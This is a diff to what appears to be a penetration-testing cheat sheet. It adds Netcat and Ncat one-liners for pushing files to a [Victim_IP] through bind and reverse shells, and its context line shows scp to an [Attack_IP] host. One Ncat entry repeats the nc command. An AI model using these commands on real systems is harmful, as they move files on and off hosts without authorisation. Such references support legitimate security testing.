@@ -102,7 +102,30 @@ scp [Attack_User]@[Attack_IP]:[Target_File_Path] [Output_File]
 ```
 
 
-# Uploading to Linux
+# Uploading
+
+## Netcat
+
+### Netcat Sending File via Bind Shell
+```bash
+nc -q 0 [Victim_IP] [Port] < [Input_File]
+```
+
+### Ncat Sending File via Bind Shell
+```bash
+nc -q 0 [Victim_IP] [Port] < [Input_File]
+```
+
+### Netcat Sending File via Reverse Shell
+```bash
+sudo nc -l -p [Port] -q 0 < [Input_File]
+```
+
+### Ncat Sending File via Reverse Shell
+```bash
+sudo ncat -l -p [Port] --send-only < [Input_File]
+```
+
 
 ## Web Upload
 
